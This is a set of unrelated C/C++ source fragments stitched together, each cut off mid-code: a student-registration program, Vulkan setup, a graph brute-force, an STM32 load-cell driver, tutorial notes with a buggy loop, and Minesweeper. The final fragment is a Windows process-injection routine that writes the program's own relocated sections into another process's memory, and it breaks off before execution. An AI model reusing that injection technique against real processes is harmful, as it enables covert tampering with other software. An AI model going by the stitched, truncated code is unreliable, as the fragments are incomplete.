inclusaoTurma(turma original[], int contOri, turma novo[], int contN, turma addTur[], int &contAdd);\r\n\r\nvoid lerAlu(aluno ca[], int &cont, cidade structcidade[], int numeroCidCad);\r\nvoid lerAddAlu(\r\n\taluno ca[], \r\n\tint &cont, \r\n\taluno aluOrig[],\r\n\tint NumeroAluCad, \r\n\tcidade structcidade[], \r\n\tint numeroCidCad\r\n);\r\nint checCodAlu(aluno ca[], int numchecAlu, int novoCodAlu);\r\nvoid inclusaoAlu(aluno original[], int contOri, aluno novo[], int contN, aluno addAlu[], int &contAdd);\r\nvoid lerAluParaExclu(aluno ca[], int &cont);\r\nvoid exclusaoAlu(aluno original[], int contOri, aluno paraExclu[], int contPx, aluno finalAlu[], int &contFim);\r\nint checAluValid(aluno ca[], int numChecAlu, int checCodAlu, cidade cb[], int numchecCid);\r\n\r\nvoid lerMatri(\r\n\tmatricula ca[], \r\n\tint &cont,\r\n\taluno aluOrig[],\r\n\tint numeroAluCad,\r\n\tcidade cidadeOrig[],\r\n\tint numchecCid,\r\n\tturma turmaOrig[], \r\n\tint numeroTurCad,\r\n\tcurso cursOrig[], \r\n\tint numeroCursCad,\r\n\tinstrutor instOrig[], \r\n\tint numeroInstCad\r\n);\r\nvoid lerAddMatri(\r\n\tmatricula ca[], \r\n\tint &cont,\r\n\tmatricula matriOrig[],\r\n\tint numeroMatriCad,\r\n\taluno aluOrig[],\r\n\tint numeroAluCad,\r\n\tcidade cidadeOrig[],\r\n\tint numchecCid,\r\n\tturma turmaOrig[], \r\n\tint numeroTurCad,\r\n\tcurso cursOrig[], \r\n\tint numeroCursCad,\r\n\tinstrutor instOrig[], \r\n\tint numeroInstCad\r\n);\r\nint checCodMatri(matricula ca[], int numChecMatri, int novoCodMatri);\r\nvoid inclusaoMatri(\r\n\tmatricula original[], \r\n\tint contOri, \r\n\tmatricula novo[], \r\n\tint contN, \r\n\tmatricula addMatri[], \r\n\tint &contAdd\r\n);\r\n\r\n\r\nint main(){\r\n\tsetlocale(LC_ALL, \"Portuguese\");  \r\n\t//Variaveis\r\n\tint tipoCadastro = 0;\r\n\tint checkCidade = 0;\r\n\tint checkCurso = 0;\r\n\tint checkInstrutor = 0;\r\n\tint checkAluno = 0;\r\n\tint checkTur = 0;\r\n\tint checkMatri = 0;\r\n\t\r\n\t//Contadores\r\n\tint contCi = 0;\r\n\tint contCurs = 0;\r\n\t\r\n\tint contInst = 0;\r\n\tint contNovoInst = 0;\r\n\tint contAddInst = 0;\r\n\t\r\n\tint contAlu = 0;\r\n\tint contNovoAlu = 0;\r\n\tint contAddAlu = 0;\r\n\t\r\n\tint contTur = 0;\r\n\tint contNovaTur = 0;\r\n\tint contAddTur = 0;\r\n\t\r\n\tint contMatri = 0;\r\n\tint contNovaMatri = 0;\r\n\tint contAddMatri = 0;\r\n\t\r\n\t//Estruturas\r\n\tcidade cidadeAtual[20];\r\n\t\r\n\tinstrutor instruAtual[20];\r\n\tinstrutor novoInst[20];\r\n\tinstrutor adicaoInst[40];\r\n\t\r\n\tcurso cursoAtual[20];\r\n\t\r\n\taluno alunoAtual[20];\r\n\taluno novoAlu[20];\r\n\taluno adicaoAlu[40];\r\n\t\r\n\tturma turmaAtual[20];\r\n\tturma novaTurma[20];\r\n\tturma adicaoTurma[40];\r\n\t\r\n\tmatricula matriAtual[20];\r\n\tmatricula novaMatri[20];\r\n\tmatricula adicaoMatri[40];\r\n\t\r\n\tdo{\r\n\t\tcout << \"Informe o n\u00famero para selecionar o cadastro, escolha -1 para finalizar o programa:\";\r\n\t\tcout << \"\\n0 - Cidade\"; \r\n\t\tcout << \"\\n1 - Curso\"; \r\n\t\tcout << \"\\n2 - Instrutor\"; \r\n\t\tcout << \"\\n3 - Aluno\"; \r\n\t\tcout << \"\\n4 - Turma\"; \r\n\t\tcout << \"\\n5 - Matr\u00edcula\";\r\n\t\tcout << \"\\n6 - Novos Registros para Instrutor:\";\r\n\t\tcout << \"\\n7 - Novos Registros/Excluir Registros para Aluno:\\n\";\r\n\t\tcin >> tipoCadastro;\r\n\t\t\r\n\t\twhile(tipoCadastro > 7){\r\n\t\t\tcout << \"\\nN\u00famero inserido inv\u00e1lido! Insira um n\u00famero de 0 a 6:\\n\";\r\n\t\t\tcin >> tipoCadastro;\r\n\t\t}\r\n\t\t\r\n\t\tswitch(tipoCadastro){\r\n\t\t\t// Case para Cidade\r\n\t\t\tcase 0:\r\n\t\t\t\tlerCid(cidadeAtual, contCi);\r\n\t\t\t\tcheckCidade = 1;\r\n\t\t\tbreak;\r\n\t\t\t\r\n\t\t\t// Case para Curso\r\n\t\t\tcase 1:\r\n\t\t\t\tlerCurs(cursoAtual, cont",
    "#define VK_NO_PROTOTYPES\n#define VOLK_IMPLEMENTATION\n\n#include <iostream>\n#include <vector>\n#include <volk.h>\n#include <SDL3/SDL.h>\n#include <SDL3/SDL_vulkan.h>\n\nint main() {\n    SDL_Init(SDL_INIT_VIDEO);\n    SDL_Vulkan_LoadLibrary(nullptr);\n    volkInitializeCustom(reinterpret_cast<PFN_vkGetInstanceProcAddr>(SDL_Vulkan_GetVkGetInstanceProcAddr()));\n\n    VkInstance instance; {\n        VkApplicationInfo applicationInfo{\n            VK_STRUCTURE_TYPE_APPLICATION_INFO, nullptr, \"2DEngine\", 0, nullptr, 0, VK_API_VERSION_1_3\n        };\n        uint32_t extension_count;\n        char const *const*extensions = SDL_Vulkan_GetInstanceExtensions(&extension_count);\n\n        const VkInstanceCreateInfo create_info{\n            VK_STRUCTURE_TYPE_INSTANCE_CREATE_INFO, nullptr, 0, &applicationInfo, 0, nullptr,\n            extension_count, extensions,\n        };\n        SDL_assert(!vkCreateInstance(&create_info, nullptr, &instance));\n        volkLoadInstance(instance);\n    }\n\n    uint32_t physical_device_count = 1;\n    VkPhysicalDevice physical_device;\n    SDL_assert(!vkEnumeratePhysicalDevices(instance, &physical_device_count, &physical_device));\n\n    SDL_Window *window{SDL_CreateWindow(\"2DEngine\", 800, 600, SDL_WINDOW_VULKAN)};\n    SDL_assert(window);\n\n    VkSurfaceKHR surface;\n    SDL_assert(SDL_Vulkan_CreateSurface(window, instance, nullptr, &surface));\n\n    float queue_priority{0};\n    VkDeviceQueueCreateInfo queue_create_info{\n        VK_STRUCTURE_TYPE_DEVICE_QUEUE_CREATE_INFO, nullptr, 0, 0, 1, &queue_priority\n    };\n\n    auto device_extension{VK_KHR_SWAPCHAIN_EXTENSION_NAME};\n    const VkDeviceCreateInfo create_info{\n        VK_STRUCTURE_TYPE_DEVICE_CREATE_INFO, nullptr, 0, 1, &queue_create_info, 0, nullptr, 1, &device_extension,\n        nullptr\n    };\n\n    VkDevice device;\n    SDL_assert(!vkCreateDevice(physical_device, &create_info, nullptr, &device));\n\n    VkQueue queue;\n    vkGetDeviceQueue(device, 0, 0, &queue);\n\n    VkSurfaceCapabilitiesKHR surface_capabilities;\n    SDL_assert(!vkGetPhysicalDeviceSurfaceCapabilitiesKHR(physical_device, surface, &surface_capabilities));\n\n    VkSwapchainKHR swapchain;\n    uint32_t queue_family_index{0};\n    const VkSwapchainCreateInfoKHR swapchain_info{\n        VK_STRUCTURE_TYPE_SWAPCHAIN_CREATE_INFO_KHR, nullptr, 0, surface, surface_capabilities.minImageCount + 1,\n        VK_FORMAT_R8G8B8A8_SRGB,\n        VK_COLORSPACE_SRGB_NONLINEAR_KHR, surface_capabilities.currentExtent.width,\n        surface_capabilities.currentExtent.height, 1, VK_IMAGE_USAGE_TRANSFER_DST_BIT, VK_SHARING_MODE_EXCLUSIVE,\n        1, &queue_family_index, VK_SURFACE_TRANSFORM_IDENTITY_BIT_KHR, VK_COMPOSITE_ALPHA_OPAQUE_BIT_KHR,\n        VK_PRESENT_MODE_FIFO_KHR, true, nullptr\n    };\n    SDL_assert(!vkCreateSwapchainKHR(device, &swapchain_info, nullptr, &swapchain));\n\n    uint32_t image_count;\n    vkGetSwapchainImagesKHR(device, swapchain, &image_count, nullptr);\n    auto images{new VkImage[image_count]};\n    vkGetSwapchainImagesKHR(device, swapchain, &image_count, images);\n\n    VkCommandPool command_pool;\n    const VkCommandPoolCreateInfo command_pool_info{\n        VK_STRUCTURE_TYPE_COMMAND_POOL_CREATE_INFO, nullptr, 0, queue_family_index\n    };\n    SDL_assert(!vkCreateCommandPool(device, &command_pool_info, nullptr, &command_pool));\n\n    std::vector<VkCommandBuffer> command_buffers{image_count};\n    const VkCommandBufferAllocateInfo command_buffer_info{\n        VK_STRUCTURE_TYPE_COMMAND_BUFFER_ALLOCATE_INFO, nullptr, command_pool, VK_COMMAND_BUFFER_LEVEL_PRIMARY,\n        image_count\n    };\n    SDL_assert(!vkAllocateCommandBuffers(device, &command_buffer_info, command_buffers.data()));\n\n    std::vector<VkSemaphore> image_available_semaphores{image_count};\n    std::vector<VkSemaphore> render_finished_semaphores{image_count};\n    std::vector<VkFence> fences{image_count};\n\n    constexpr VkSemaphoreCreateInfo semaphore_info{VK_STRUCTURE_TYPE_SEMAPHORE_CREATE_INFO, nullptr, 0};\n    constexpr VkFenceCreateInfo fence_info{VK_STRUCTURE_TYPE_FENCE_CREATE_INFO, nullptr, 0};\n    for (uint32_t i{}; i < image_count; ++i) {\n        SDL_assert(!vkCreateSemaphore(device, &semaphore_info, nullptr, &image_available_semaphores[i]));\n        SDL_assert(!vkCreateSemaphore(device, &semaphore_info, nullptr, &render_finished_semaphores[i]));\n        SDL_assert(!vkCreateFence(device, &fence_info, nullptr, &fences[i]));\n    }\n\n    // clear the screen\n    for (uint32_t i{}; i < image_count; ++i) {\n        constexpr VkCommandBufferBeginInfo begin_info{\n            VK_STRUCTURE_TYPE_COMMAND_BUFFER_BEGIN_INFO, nullptr, VK_COMMAND_BUFFER_USAGE_SIMULTANEOUS_USE_BIT,\n            nullptr\n        };\n        VkCommandBuffer command_buffer{command_buffers[i]};\n        VkSemaphore image_available_semaphore{image_available_semaphores[i]};\n        VkSemaphore render_finished_semaphore{render_finished_semaphores[i]};\n\n        SDL_assert(!vkBeginCommandBuffer(command_buffer, &begin_info));\n\n        const VkImageMemoryBarrier barrier{\n            VK_STRUC",
    "#include <iostream>\n//#include <bits/stdc++.h>\n\nusing namespace std;\n\nint V;\nint result = 0;\n\nvoid floydWarshall(int graphdata[])\n{\n    int dist[100][100] = { 0 };\n    int i, j, k;\n\n    k = 0;\n    for (i = 0; i < V; i++) {\n        for (j = 0; j < V; j++) {\n            if (i == j && graphdata[i * V + j] == 0) {\n                return;\n            }\n            dist[i][j] = graphdata[i * V + j];\n        }\n    }\n\n    for (k = 0; k < V; k++) {\n        for (i = 0; i < V; i++) {\n            for (j = 0; j < V; j++) {\n                dist[i][j] = dist[i][j] | (dist[i][k] & dist[k][j]);\n            }\n        }\n    }\n\n    bool same = true;\n    for (i = 0; i < V; i++) {\n        for (j = 0; j < V; j++) {\n            if (dist[i][j] != graphdata[i * V + j]) {\n                same = false;\n                break;\n            }\n        }\n    }\n\n    if (same == true) {\n        result++;\n    }\n}\n\nvoid printSolution(int dist[][101])\n{\n    for (int i = 0; i < V; i++) {\n        for (int j = 0; j < V; j++) {\n            cout << dist[i][j] << \"   \";\n        }\n        cout << endl;\n    }\n}\n\nvoid T(int graphdata[], int current) {\n    if (current == V * V) {\n        floydWarshall(graphdata);\n        return;\n    }\n    graphdata[current] = 0;\n    T(graphdata, current + 1);\n\n    graphdata[current] = 1;\n    T(graphdata, current + 1);\n}\n\nint main()\n{\n    scanf_s(\"%d\", &V);\n\n    int graphdata[10001];\n\n    result = 0;\n    T(graphdata, 0);\n\n    printf(\"%d\\n\", result);\n\n    return 0;\n}\n",
    "/*\n  This is an STM32 library written for the NAU7802 24-bit wheatstone\n  bridge and load cell amplifier, using the HAL library.\n  Adapted from the Arduino library by Nathan Seidle @ SparkFun Electronics\n\n  Modified and ported to STM32 using HAL by Yasir Shahzad\n  Copyright (c) 2023 Yasir Shahzad (yasirshahzad918@gmail.com)\n\n  Original Arduino library:\n  https://github.com/sparkfun/SparkFun_NAU7802_Scale_Arduino_Library\n*/\n\n#include \"NAU7802_STM32_HAL_Driver.h\"\n\n//Constructor\nNAU7802::NAU7802()\n{\n}\n\n//Sets up the NAU7802 for basic function\n//If initialize is true (or not specified), default init and calibration is performed\n//If initialize is false, then it's up to the caller to initalize and calibrate\n//Returns true upon completion\nbool NAU7802::begin(I2C_HandleTypeDef *hi2c, bool initialize)\n{\n  //Get user's options\n  _hi2c = hi2c;\n\n  //Check if the device ack's over I2C\n  if (isConnected() == false)\n  {\n    //There are rare times when the sensor is occupied and doesn't ack. A 2nd try resolves this.\n    if (isConnected() == false)\n      return (false);\n  }\n\n  bool result = true; //Accumulate a result as we do the setup\n\n  if (initialize)\n  {\n    result &= reset(); //Reset all registers\n\n    result &= powerUp(); //Power on analog and digital sections of the scale\n\n    result &= setLDO(NAU7802_LDO_3V0); //Set LDO to 3.3V\n\n    result &= setGain(NAU7802_GAIN_128); //Set gain to 128\n\n    result &= setSampleRate(NAU7802_SPS_10); //Set samples per second to 10\n\n    //Turn off CLK_CHP. From 9.1 power on sequencing.\n    uint8_t adc = getRegister(NAU7802_ADC);\n    adc |= 0x30;\n    result &= setRegister(NAU7802_ADC, adc);\n\n    result &= setBit(NAU7802_PGA_PWR_PGA_CAP_EN, NAU7802_PGA_PWR); //Enable 330pF decoupling cap on chan 2. From 9.14 application circuit note.\n\n    result &= clearBit(NAU7802_PGA_LDOMODE, NAU7802_PGA); //Ensure LDOMODE bit is clear - improved accuracy and higher DC gain, with ESR < 1 ohm\n\n    HAL_Delay(_ldoRampDelay); //Wait for LDO to stabilize - takes about 200ms\n\n    getWeight(true, 10); //Flush\n\n    result &= calibrateAFE(); //Re-cal analog front end when we change gain, sample rate, or channel\n  }\n\n  return (result);\n}\n\n//Returns true if device is present\n//Tests for device ack to I2C address\nbool NAU7802::isConnected()\n{\n    if (HAL_I2C_IsDeviceReady(_hi2c, _deviceAddress<<1, 3, 100) != HAL_OK)\n        return (false); //Sensor did not ACK\n    return (true);    //All good\n}\n\n//Returns true if Cycle Ready bit is set (conversion is complete)\nbool NAU7802::available()\n{\n  return (getBit(NAU7802_PU_CTRL_CR, NAU7802_PU_CTRL));\n}\n\n//Calibrate analog front end of system. Returns true if CAL_ERR bit is 0 (no error)\n//Takes approximately 344ms to calibrate; wait up to 1000ms.\n//It is recommended that the AFE be re-calibrated any time the gain, SPS, or channel number is changed.\nbool NAU7802::calibrateAFE(NAU7802_Cal_Mode mode)\n{\n  beginCalibrateAFE(mode);\n  return waitForCalibrateAFE(1000);\n}\n\n//Begin asynchronous calibration of the analog front end.\n// Poll for completion with calAFEStatus() or wait with waitForCalibrateAFE()\nvoid NAU7802::beginCalibrateAFE(NAU7802_Cal_Mode mode)\n{\n  uint8_t value = getRegister(NAU7802_CTRL2);\n  value &= 0xFC; // Clear CALMOD bits\n  uint8_t calMode = (uint8_t)mode;\n  calMode &= 0x03; // Limit mode to 2 bits\n  value |= calMode; // Set the mode\n  setRegister(NAU7802_CTRL2, value);\n\n  setBit(NAU7802_CTRL2_CALS, NAU7802_CTRL2);\n}\n\n//Check calibration status.\nNAU7802_Cal_Status NAU7802::calAFEStatus()\n{\n  if (getBit(NAU7802_CTRL2_CALS, NAU7802_CTRL2))\n  {\n    return NAU7802_CAL_IN_PROGRESS;\n  }\n\n  if (getBit(NAU7802_CTRL2_CAL_ERROR, NAU7802_CTRL2))\n  {\n    return NAU7802_CAL_FAILURE;\n  }\n\n  // Calibration passed\n  return NAU7802_CAL_SUCCESS;\n}\n\n//Wait for asynchronous AFE calibration to complete with optional timeout.\n//If timeout is not specified (or set to 0), then wait indefinitely.\n//Returns true if calibration completes succsfully, otherwise returns false.\nbool NAU7802::waitForCalibrateAFE(unsigned long timeout_ms)\n{\n  unsigned long startTime = HAL_GetTick();\n  NAU7802_Cal_Status cal_ready;\n\n  while ((cal_ready = calAFEStatus()) == NAU7802_CAL_IN_PROGRESS)\n  {\n    if ((timeout_ms > 0) && ((HAL_GetTick() - startTime) > timeout_ms))\n    {\n      break;\n    }\n    HAL_Delay(1);\n  }\n\n  if (cal_ready == NAU7802_CAL_SUCCESS)\n  {\n    return (true);\n  }\n  return (false);\n}\n\n//Set the readings per second\n//10, 20, 40, 80, and 320 samples per second is available\nbool NAU7802::setSampleRate(uint8_t rate)\n{\n  if (rate > 0b111)\n    rate = 0b111; //Error check\n\n  uint8_t value = getRegister(NAU7802_CTRL2);\n  value &= 0b10001111; //Clear CRS bits\n  value |= rate << 4;  //Mask in new CRS bits\n\n  return (setRegister(NAU7802_CTRL2, value));\n}\n\n//Select between 1 and 2\nbool NAU7802::setChannel(uint8_t channelNumber)\n{\n  if (channelNumber == NAU7802_CHANNEL_1)\n    return (clearBit(NAU7802_CTRL2_CHS, NAU7802_CTRL2)); //Channel 1 (default)\n  else\n    return (setBit(NAU7802_CTRL2_CHS, NAU78",
    "//This is a comment\n/* multiline \ncomment\n*/\n\n//Whitespace is ignored!\n//Capitalization matters!\n//The Header--wherein functions, classes, etc are defined and other libraries or documents are imported\n//at the top, to allow input and output\n#include <iostream>\n//for math\n#include <cmath>\n//standard\n#include <cstdlib>\n#include <list>\n\nusing namespace std;\n\n//define a class\nclass Standard {\n    public:\n        Standard();\n        void SetVariable(int paramater);\n        int GetVariable() const;\n    private:\n        int example; \n};\n//Constructor--called every time a variable of the class is declared\nStandard::Standard() {\n    example = 0; //variables often have a default value that means unset\n}\n//define functions declared in class\nvoid Standard::SetVariable(int parameter){\n    example = parameter;\n}\nint Standard::GetVariable() const {\n    return example;\n}\n\n//the main program, what is executed\nint main() {\n    //each statement ends with semicolon\n    //assign a variable, with a type\n    double wage;\n    wage = 20.0;\n\n    //const for constants, all caps and underscores\n    const int HOURS_PER_WEEK = 40;\n\n    //Arrays, Lists, Vectors (Vector default)\n\n    //declare array--from C, size fixed, must be deallocated explicitly, must be defined locally\n    int* exampleArray = new int[7];\n    delete[] exampleArray;\n\n    //declare vector--subset of array, can resize/mutate/iterate, can copy or assign directly\n    vector<int> hoursByDay;\n\n    //declare a list--double linked list--non contiguous memory\n    list<int> exampleList;\n\n    //ways to input values--works for all\n    //push back adds to end\n    vector<int> type1;\n    for (int i = 0; i < 5; i + 1) {\n        type1.push_back(10);\n    }\n    //declare with length and efault value\n    vector<int> type2(5, 10);\n    //all at once (like an array)\n    vector<int> type3{10, 10, 10, 10, 10};\n\n\n    //create an object of type class\n    Standard classObject;\n    classObject.SetVariable(5);\n\n\n    //cin \"characters in\" to get input from keyboard, >> to assign to variable\n    cin >> wage;\n\n    int a = wage;\n\n    //conditionals\n    //switch--specific instances, simplified\n    switch(a) {\n        case 0:\n            cout << \"Get a job!\" << endl;\n            break;\n        default:\n            break;\n    }\n\n    //standard if, else, else if setup\n    if (wage <= 12.0) {\n        cout << \"Ouch.\" << endl;\n    }\n    else if (wage >= 60) {\n        cout << \"Nice.\" << endl;\n    }\n\n    //cout to output or 'print', no automatic end line, << concatenates\n    cout << \"Salary is \" << wage * HOURS_PER_WEEK * 52 << endl;\n    cout << \"Monthly Salary is \" << wage * HOURS_PER_WEEK * 52 / 12 << endl;\n    //endl (or \"/n\") is enter\n    cout << endl;\n\n    //signifies the end of program \n    return 0;\n}\n\n// Notes\n    // (static_cast<type>(expression)) will convert variable type\n    // int/int results in int, e.g. 3/5 -> 1\n    // often needs import for data types such as vectors, lists, etc\n    // character single quote-- 'c' string double quote-- \"string\" \n    // names are only valid within their scope\n\n// Compiling\n    // command line, in your program's folder\n    // standard:\n    // g++ -o name-of-executable yourfile.cpp\n    // to show warnings:\n    // g++ -Wall yourfile.cpp\n\n    // to run:\n    // ./executable\n    // test (compile/run)  often\n\n\n//Compile errors\n    //errors are at or before reported\n    //if several, look to fix the FIRST and recompile\n\n//Compile warnings\n    //good practice is to see and address all\n\n//Bugs\n    //if compiles, but doesn't work, it's a logic error or bug\n    //test small sections, outputs, flags, etc\n",
    "// C++ Program for Implementation of Minesweeper Game: Input\n// for coordinates is taken from user\n#include <bits/stdc++.h>\nusing namespace std;\n\n#define BEGINNER 0\n#define INTERMEDIATE 1\n#define ADVANCED 2\n#define MAXSIDE 25\n#define MAXMINES 99\n#define MOVESIZE 526 // (25 * 25 - 99)\n\nint SIDE; // side length of the board\nint MINES; // number of mines on the board\n\n// A Utility Function to check whether given cell (row, col)\n// is a valid cell or not\nbool isValid(int row, int col)\n{\n    // Returns true if row number and column number\n    // is in range\n    return (row >= 0) && (row < SIDE) && (col >= 0)\n           && (col < SIDE);\n}\n\nclass Board {\n\npublic:\n    char** board;\n    Board()\n    {\n        board = new char*[MAXSIDE + 1];\n        for (int i = 0; i <= MAXSIDE; i++) {\n            board[i] = new char[MAXSIDE + 1];\n            for (int j = 0; j <= MAXSIDE; j++) {\n                board[i][j] = '-';\n            }\n        }\n    }\n\n    // A Utility Function to check whether given cell (row,\n    // col) has a mine or not.\n    bool isMine(int row, int col)\n    {\n        if (board[row][col] == '*')\n            return (true);\n        else\n            return (false);\n    }\n\n    // A Function to get the user's move\n    void makeMove(int* x, int* y)\n    {\n        // Take the input move\n        printf(\"Enter your move, (row, column) -> \");\n        scanf(\"%d %d\", x, y);\n        return;\n    }\n\n    // A Function to print the current gameplay board\n    void printBoard()\n    {\n        int i, j;\n        printf(\"    \");\n\n        for (i = 0; i < SIDE; i++)\n            printf(\"%d \", i);\n\n        printf(\"\\n\\n\");\n\n        for (i = 0; i < SIDE; i++) {\n            printf(\"%d   \", i);\n\n            for (j = 0; j < SIDE; j++)\n                printf(\"%c \", board[i][j]);\n            printf(\"\\n\");\n        }\n        return;\n    }\n\n    // A Function to count the number of\n    // mines in the adjacent cells\n    int countAdjacentMines(int row, int col, int mines[][2])\n    {\n        int i;\n        int count = 0;\n\n        /*\n            Count all the mines in the 8 adjacent\n            cells\n\n                N.W   N   N.E\n                  \\   |   /\n                   \\  |  /\n                W----Cell----E\n                     / | \\\n                   /   |  \\\n                S.W    S   S.E\n\n            Cell-->Current Cell (row, col)\n            N -->  North        (row-1, col)\n            S -->  South        (row+1, col)\n            E -->  East         (row, col+1)\n            W -->  West            (row, col-1)\n            N.E--> North-East   (row-1, col+1)\n            N.W--> North-West   (row-1, col-1)\n            S.E--> South-East   (row+1, col+1)\n            S.W--> South-West   (row+1, col-1)\n        */\n\n        int dx[8] = { -1, -1, -1, 0, 0, 1, 1, 1 };\n        int dy[8] = { -1, 0, 1, -1, 1, -1, 0, 1 };\n\n        for (int d = 0; d < 8; d++) {\n            int newRow = row + dx[d];\n            int newCol = col + dy[d];\n\n            if (isValid(newRow, newCol) == true) {\n                if (isMine(newRow, newCol) == true)\n                    count++;\n            }\n        }\n        return (count);\n    }\n\n    // A Function to place the mines randomly\n    // on the board\n    void placeMines(int mines[][2])\n    {\n        bool mark[MAXSIDE * MAXSIDE];\n\n        memset(mark, false, sizeof(mark));\n\n        // Continue until all random mines have been\n        // created.\n        for (int i = 0; i < MINES;) {\n            int random = rand() % (SIDE * SIDE);\n            int x = random / SIDE;\n            int y = random % SIDE;\n\n            // Add the mine if no mine is placed at this\n            // position on the board\n            if (mark[random] == false) {\n                // Row Index of the Mine\n                mines[i][0] = x;\n                // Column Index of the Mine\n                mines[i][1] = y;\n\n                // Place the mine\n                board[mines[i][0]][mines[i][1]] = '*';\n                mark[random] = true;\n                i++;\n            }\n        }\n        return;\n    }\n\n    // A function to replace the mine from (row, col) and\n    // put it to a vacant space\n    void replaceMine(int row, int col)\n    {\n        for (int i = 0; i < SIDE; i++) {\n            for (int j = 0; j < SIDE; j++) {\n                // Find the first location in the board\n                // which is not having a mine and put a mine\n                // there.\n                if (board[i][j] != '*') {\n                    board[i][j] = '*';\n                    board[row][col] = '-';\n                    return;\n                }\n            }\n        }\n        return;\n    }\n};\nclass Game {\npublic:\n    // A Recursive Function to play the Minesweeper Game\n    bool playMinesweeperUtil(Board& myBoard,\n                             Board& realBoard,\n                             int mines[][2], int row,\n                             int col, int* movesLeft)\n    {\n        // Base Case of Recursion\n        if (myBoard.board[row][col] != '-')\n            return (",
    "\ufeff#include <iostream>\r\n#include <windows.h>\r\n\r\n/*\r\n* 1.C/C++\r\n* \u5e38\u89c4: SDL\u68c0\u67e5(\u5426)\r\n* \u4f18\u5316: \u4f18\u5316(\u5df2\u7981\u7528)\r\n* \u4ee3\u7801\u751f\u6210: \u8fd0\u884c\u5e93(\u591a\u7ebf\u7a0b)\u3001\u5b89\u5168\u68c0\u67e5(\u7981\u7528\u5b89\u5168\u68c0\u67e5)\r\n* 2.\u94fe\u63a5\u5668\r\n* \u6e05\u5355\u6587\u4ef6: \u751f\u6210\u6e05\u5355(\u5426)\r\n* \u8c03\u8bd5: \u751f\u6210\u8c03\u8bd5\u4fe1\u606f(\u5426)\r\n*/\r\n\r\nusing namespace std;\r\n\r\n// \u6838\u5fc3\u529f\u80fd\r\nvoid MyMessageBox() {\r\n    char text[] = { '\\0' };\r\n    MessageBoxA(0, text, text, MB_ICONINFORMATION);\r\n}\r\n\r\n#pragma code_seg(\".shell\")\r\n\r\n// \u5bfc\u5165 Sections \u6240\u9700\u7684 DLL\r\nvoid ImportDll(char* importDllNames) {\r\n    while (1) {\r\n        char* importDllName = importDllNames;\r\n        int importDllNameLength = strlen(importDllName);\r\n        if (!importDllNameLength) {\r\n            break;\r\n        }\r\n        LoadLibraryA(importDllName);\r\n        importDllNames += importDllNameLength + 1;\r\n    }\r\n\r\n    // \u8c03\u7528\u6838\u5fc3\u529f\u80fd\r\n    MyMessageBox();\r\n}\r\n\r\n#pragma code_seg(\".text\")\r\n\r\nint main() {\r\n    // \u76ee\u6807\u8fdb\u7a0b PID\r\n    int pid = 123;\r\n\r\n    // \u5f53\u524d\u8fdb\u7a0b\u57fa\u5740\r\n    DWORD_PTR currentImageBase = (DWORD_PTR)GetModuleHandle(NULL);\r\n\r\n    // PE \u7ed3\u6784\u4fe1\u606f\r\n    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)currentImageBase;\r\n    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(currentImageBase + pDos->e_lfanew);\r\n    DWORD_PTR imageBase = pNt->OptionalHeader.ImageBase;\r\n    DWORD sizeOfImage = pNt->OptionalHeader.SizeOfImage;\r\n    DWORD sizeOfHeaders = pNt->OptionalHeader.SizeOfHeaders;\r\n    DWORD sizeOfSections = sizeOfImage - sizeOfHeaders;\r\n    DWORD importDirRVA = ((PIMAGE_DATA_DIRECTORY) & (pNt->OptionalHeader.DataDirectory[1]))->VirtualAddress;\r\n    DWORD relocDirRVA = ((PIMAGE_DATA_DIRECTORY) & (pNt->OptionalHeader.DataDirectory[5]))->VirtualAddress;\r\n\r\n    // \u6784\u9020\u8981\u6ce8\u5165\u7684 Sections\r\n    PVOID pInjectSections = malloc(sizeOfSections);\r\n    memcpy(pInjectSections, (PVOID)(currentImageBase + sizeOfHeaders), sizeOfSections);\r\n\r\n    // \u904d\u5386\u5bfc\u5165\u8868 (\u6536\u96c6\u5168\u90e8 DLL \u540d\u79f0)\r\n    char importDllNames[1000] = \"\";\r\n    int importDllNamesLength = -1;\r\n    PIMAGE_IMPORT_DESCRIPTOR pImportDir = (PIMAGE_IMPORT_DESCRIPTOR)(currentImageBase + importDirRVA);\r\n    while (pImportDir->FirstThunk) {\r\n        char* importDllName = (char*)(currentImageBase + pImportDir->Name);\r\n        strncat_s(importDllNames + importDllNamesLength + 1, sizeof(importDllNames) - importDllNamesLength - 1, importDllName, strlen(importDllName) + 1);\r\n        importDllNamesLength += strlen(importDllName) + 1;\r\n        pImportDir++;\r\n    }\r\n    importDllNamesLength += 2; // kernel32.dll\\0user32.dll\\0\\0\r\n\r\n    // \u76ee\u6807\u8fdb\u7a0b\u53e5\u67c4\r\n    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);\r\n    // \u7533\u8bf7\u6ce8\u5165\u7a7a\u95f4\r\n    PVOID pSections = VirtualAllocEx(hProcess, NULL, sizeOfSections + importDllNamesLength, MEM_COMMIT, PAGE_READWRITE);\r\n\r\n    // \u5730\u5740\u91cd\u5b9a\u4f4d (\u6839\u636e \u6ce8\u5165\u7a7a\u95f4 \u57fa\u5740\u5bf9 Sections \u91cd\u5b9a\u4f4d)\r\n    PIMAGE_BASE_RELOCATION pRelocDir = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)pInjectSections - sizeOfHeaders + relocDirRVA);\r\n    while (pRelocDir->SizeOfBlock) {\r\n        PWORD pOffset = (PWORD)((DWORD_PTR)pRelocDir + sizeof(IMAGE_BASE_RELOCATION));\r\n        int offsetNum = (pRelocDir->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);\r\n        for (int i = 0; i < offsetNum; i++) {\r\n            if (pOffset[i] >> 12 == IMAGE_REL_BASED_HIGHLOW || pOffset[i] >> 12 == IMAGE_REL_BASED_DIR64) {\r\n                *(PDWORD_PTR)((DWORD_PTR)pInjectSections - sizeOfHeaders + pRelocDir->VirtualAddress + (pOffset[i] & 0xFFF)) += (DWORD_PTR)pSections - sizeOfHeaders - imageBase;\r\n            }\r\n        }\r\n        pRelocDir = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)pRelocDir + pRelocDir->SizeOfBlock);\r\n    }\r\n\r\n    // \u6ce8\u5165 Sections\r\n    WriteProcessMemory(hProcess, pSections, pInjectSections, sizeOfSections, NULL);\r\n    // \u6ce8\u5165\u5168\u90e8 DLL \u540d\u79f0\r\n    WriteProcessMemory(hProcess, (PVOID)((DWORD_PTR)pSections + sizeOfSections), importDllNames, importDllNamesLength, NULL);\r\n\r\n    // 